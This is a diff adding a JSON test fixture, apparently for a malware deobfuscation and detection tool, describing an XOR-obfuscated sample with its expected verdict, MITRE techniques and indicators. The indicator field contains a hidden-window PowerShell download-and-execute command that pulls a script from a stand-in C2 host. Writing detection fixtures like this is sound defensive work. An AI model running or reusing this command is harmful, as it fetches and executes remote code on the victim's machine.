@@ -1,0 +1,24 @@
+{
+  "id": "xor-single-3",
+  "algorithm": "XOR-single",
+  "key_status": "inline-static",
+  "recoverable_stages": [
+    "hex-decode",
+    "xor-single-decrypt",
+    "utf8-decode"
+  ],
+  "runtime_stages": [],
+  "expected_verdict": "malicious",
+  "expected_iocs": [
+    "powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://c2/x.ps1')"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1059.001",
+    "T1140"
+  ],
+  "static_recovery_verdict": "static-recovery-complete"
+}
